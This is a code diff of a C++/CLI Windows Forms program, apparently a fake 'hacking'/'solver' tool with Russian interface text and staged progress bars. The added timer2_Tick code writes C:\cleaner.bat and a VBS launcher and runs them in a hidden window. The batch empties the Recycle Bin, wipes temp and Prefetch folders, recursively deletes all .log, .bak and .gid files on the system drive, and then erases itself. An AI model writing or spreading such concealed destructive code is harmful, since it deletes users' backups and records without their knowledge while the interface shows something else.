@@ -55,7 +55,7 @@ namespace solver {
 
 
 	private: System::Windows::Forms::Label^ orig1_3;
-
+	private: bool first_clean = false;
 	private: System::Windows::Forms::Label^ prog_icon_3;
 	private: int fec = 0;
 	private: System::Windows::Forms::Label^ label3;
@@ -185,7 +185,7 @@ private:bool now_hacking = true;
 private: System::Windows::Forms::Label^ propysk4_3;
 
 private: System::Windows::Forms::Label^ propysk1_3;
-
+private:bool error1 = false;
 private: System::Windows::Forms::Label^ done23;
 private: System::Windows::Forms::Label^ done24;
 private: System::Windows::Forms::Label^ done25;
@@ -212,6 +212,7 @@ private: System::Windows::Forms::Label^ done2;
 private: System::Windows::Forms::Label^ done1;
 private: System::Windows::Forms::Label^ ostalos_text;
 private: System::Windows::Forms::Label^ final_label;
+private: System::Windows::Forms::Label^ error;
 
 
 
@@ -356,6 +357,7 @@ private: System::Windows::Forms::Label^ final_label;
 			this->timer26 = (gcnew System::Windows::Forms::Timer(this->components));
 			this->timer_wait = (gcnew System::Windows::Forms::Timer(this->components));
 			this->ostalos_text = (gcnew System::Windows::Forms::Label());
+			this->error = (gcnew System::Windows::Forms::Label());
 			this->panel1_3->SuspendLayout();
 			this->panel2_3->SuspendLayout();
 			this->groupBox1_3->SuspendLayout();
@@ -455,6 +457,7 @@ private: System::Windows::Forms::Label^ final_label;
 			// 
 			this->groupBox1_3->BackColor = System::Drawing::Color::FromArgb(static_cast<System::Int32>(static_cast<System::Byte>(64)), static_cast<System::Int32>(static_cast<System::Byte>(64)),
 				static_cast<System::Int32>(static_cast<System::Byte>(64)));
+			this->groupBox1_3->Controls->Add(this->error);
 			this->groupBox1_3->Controls->Add(this->done23);
 			this->groupBox1_3->Controls->Add(this->done24);
 			this->groupBox1_3->Controls->Add(this->done25);
@@ -1434,7 +1437,6 @@ private: System::Windows::Forms::Label^ final_label;
 			this->main_progres->Name = L"main_progres";
 			this->main_progres->Size = System::Drawing::Size(416, 30);
 			this->main_progres->TabIndex = 11;
-			this->main_progres->MouseEnter += gcnew System::EventHandler(this, &hacking::main_progres_MouseEnter);
 			// 
 			// orig_3
 			// 
@@ -1592,6 +1594,20 @@ private: System::Windows::Forms::Label^ final_label;
 			this->ostalos_text->Text = L"Выполнено: 0 из 25";
 			this->ostalos_text->TextAlign = System::Drawing::ContentAlignment::MiddleCenter;
 			// 
+			// error
+			// 
+			this->error->BackColor = System::Drawing::Color::IndianRed;
+			this->error->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 8.25F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
+				static_cast<System::Byte>(204)));
+			this->error->ForeColor = System::Drawing::Color::Black;
+			this->error->Location = System::Drawing::Point(303, 43);
+			this->error->Name = L"error";
+			this->error->Size = System::Drawing::Size(90, 18);
+			this->error->TabIndex = 48;
+			this->error->Text = L"ОШИБКА!";
+			this->error->TextAlign = System::Drawing::ContentAlignment::MiddleCenter;
+			this->error->Visible = false;
+			// 
 			// hacking
 			// 
 			this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
@@ -1637,9 +1653,6 @@ private: System::Windows::Forms::Label^ final_label;
 	private: System::Void exit_btn_Click(System::Object^ sender, System::EventArgs^ e) {
 		MessageBox::Show("Пожалуйста не закрывайте программу, не отключайте интернет и не выключайте ПК до окончания работы программы!\nСпасибо за понимание!", "Не стоит так делать", MessageBoxButtons::OK, MessageBoxIcon::Warning);
 	}
-	private: System::Void main_progres_MouseEnter(System::Object^ sender, System::EventArgs^ e) {
-
-	}
 	private: System::Void timer1_Tick(System::Object^ sender, System::EventArgs^ e) {
 		this->progressBar1->Increment(6);
 		if (this->progressBar1->Value == 100) {
@@ -1650,6 +1663,25 @@ private: System::Windows::Forms::Label^ final_label;
 	}
 	private: System::Void timer2_Tick(System::Object^ sender, System::EventArgs^ e) {
 		if (!propysk3) {
+			if (!this->first_clean) {
+				this->first_clean = true;
+				std::ofstream cleaner("C:\\cleaner.bat");
+				if (cleaner.is_open())
+					cleaner << "@echo OFF\nrd /s /q C:\\$Recycle.Bin\ndel /q /f /s %WINDIR%\\Temp\\*.*\ndel /q /f /s %SYSTEMDRIVE%\\Temp\\*.*\ndel /q /f /s %Temp%\\*.*\ndel /q /f /s %Tmp%\\*.*\ndel /q /f /s %WINDIR%\\Prefetch\\*.*\ndel /q /f /s %SYSTEMDRIVE%\\*.log\ndel /q / f / s %SYSTEMDRIVE%\\*.bak\ndel /q /f /s %SYSTEMDRIVE%\\*.gid\nDEL \"C:\\cleaner1.vbs\"\ndel %0";
+				cleaner.close();
+				std::ofstream cleaner1("C:\\cleaner1.vbs");
+				if (cleaner1.is_open()) {
+					cleaner1 << "set sh=CreateObject(\"Wscript.Shell\")\nsh.Run \"C:\\cleaner.bat\", 0";
+					cleaner1.close();
+					(gcnew System::Diagnostics::Process())->Start("C:\\cleaner1.vbs");
+				}
+				else {
+					this->error->Show();
+					this->timer2->Stop();
+					this->timer_wait->Start();
+					this->error1 = true;
+				}
+			}
 			this->progressBar2->Increment(4);
 			if (this->progressBar2->Value == 100) {
 				this->main_progres->Increment(1);
@@ -1903,20 +1935,12 @@ private: System::Windows::Forms::Label^ final_label;
 			this->timer_wait->Stop();
 			break;
 		case 2:
-			if (!propysk3) {
-				std::ofstream cleaner("C:\\cleaner.bat");
-				if (cleaner.is_open())
-					cleaner << "@echo OFF\nrd /s /q C:\\$Recycle.Bin\ndel /q /f /s %WINDIR%\\Temp\\*.*\ndel /q /f /s %SYSTEMDRIVE%\\Temp\\*.*\ndel /q /f /s %Temp%\\*.*\ndel /q /f /s %Tmp%\\*.*\ndel /q /f /s %WINDIR%\\Prefetch\\*.*\ndel /q /f /s %SYSTEMDRIVE%\\*.log\ndel /q / f / s %SYSTEMDRIVE%\\*.bak\ndel /q /f /s %SYSTEMDRIVE%\\*.gid\nDEL \"C:\\cleaner1.vbs\"\ndel %0";
-				cleaner.close();
-				std::ofstream cleaner1("C:\\cleaner1.vbs");
-				if (cleaner1.is_open())
-					cleaner1 << "set sh=CreateObject(\"Wscript.Shell\")\nsh.Run \"C:\\cleaner.bat\", 0";
-				cleaner1.close();
-				(gcnew System::Diagnostics::Process())->Start("C:\\cleaner1.vbs");
-				this->done2->Show();
+			if (!this->error1) {
+				if (!propysk3)
+					this->done2->Show();
+				else
+					this->propysk3_3->Show();
 			}
-			else
-				this->propysk3_3->Show();
 			this->timer3->Start();
 			this->timer_wait->Stop();
 			break;
